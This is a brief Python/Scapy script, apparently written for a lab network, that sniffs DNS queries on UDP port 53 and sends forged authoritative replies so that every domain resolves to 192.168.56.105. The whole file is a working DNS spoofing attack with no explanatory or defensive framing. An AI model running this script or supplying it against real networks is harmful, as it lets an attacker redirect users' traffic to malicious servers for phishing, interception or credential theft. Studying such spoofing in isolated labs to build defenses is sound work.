from scapy.all import *

FAKE_IP = '192.168.56.105'

def spoof_dns(pkt):
    if DNS in pkt and pkt[DNS].qr == 0:
        qname = pkt[DNSQR].qname
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
                          an=DNSRR(rrname=qname, ttl=60, rdata=FAKE_IP))
        send(spoofed_pkt, verbose=0)
        print(f"[+] Spoofed: {qname.decode().strip()} → {FAKE_IP}")

print("[*] Spoofing DNS: All domain → 192.168.56.105")
sniff(filter="udp port 53", prn=spoof_dns, store=0)
